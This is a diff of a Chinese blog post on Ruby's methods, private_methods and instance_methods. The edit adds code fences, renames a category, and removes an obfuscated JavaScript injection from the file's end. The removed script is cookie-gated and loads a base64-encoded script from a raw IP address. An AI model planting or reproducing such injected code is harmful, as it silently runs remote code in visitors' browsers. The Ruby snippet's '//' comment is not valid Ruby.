@@ -3,7 +3,7 @@ title: '浅析Ruby中的methods,private_methods和instance_methods'
 tags: []
 id: '143'
 categories:
-  - - program_language
+  - - 编程语言
     - Ruby
 date: 2019-05-12 14:03:06
 ---
@@ -26,6 +26,7 @@ date: 2019-05-12 14:03:06
 
 这里说一般，是因为如果在一个普通对象的单例类中定义了一个实例方法，那么普通对象的methods就会比其所属类的实例方法要多。举例如下:
 
+```ruby
 obj = String.new("abc")  
 obj.instance_eval {  
   def method1  
@@ -33,6 +34,7 @@ obj.instance_eval {
   end  
 }  
 p obj.methods == String.instance_methods //false
+```
 
 ## 最后,methods方法返回的是对象的public,protected方法，所以还要有一个private_methods方法返回其private方法。
 
@@ -40,5 +42,3 @@ p obj.methods == String.instance_methods //false
 来源：CSDN  
 原文：https://blog.csdn.net/happyAnger6/article/details/42436879  
 版权声明：本文为博主原创文章，转载请附上博文链接！
-
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
